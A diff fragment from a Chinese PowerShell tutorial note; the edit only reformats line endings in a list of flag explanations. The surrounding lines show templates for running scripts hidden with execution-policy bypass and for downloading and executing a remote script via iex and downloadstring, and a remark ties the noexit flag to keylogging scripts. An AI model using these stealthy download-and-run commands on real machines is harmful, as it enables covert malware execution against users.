@@ -53,11 +53,11 @@ Get-ExecutionPolicy：
 - ②本地隐藏绕过权限执行脚本：`Powershell.exe-executionpolicy bypass-windowstyle hidden-nologo-noninteractive-noprofile-file xxx.ps1`
 - ③用iex下载远程ps1脚本绕过权限执行：Powershell.exe-executionpolicy bypass-windowstyle hidden-noprofile-noni iex(new-objectnet.webclient) .downloadstring("xxx.ps1");[parameters]
 
-参数说明：
-Windowstyle hidden:隐藏窗口
-Nologo: 启动不显示版权标志的powershell
-Noninteractive(noni):非交互模式，powershell不为用户提供交互的提示
-noprofile（nop）：powershell控制台不加载当前用户的配置文件
-noexit：执行后不退出脚本，在使用键盘记录等脚本时非常重要、
+参数说明：  
+Windowstyle hidden:隐藏窗口  
+Nologo: 启动不显示版权标志的powershell  
+Noninteractive(noni):非交互模式，powershell不为用户提供交互的提示  
+noprofile（nop）：powershell控制台不加载当前用户的配置文件  
+noexit：执行后不退出脚本，在使用键盘记录等脚本时非常重要、  
 
 
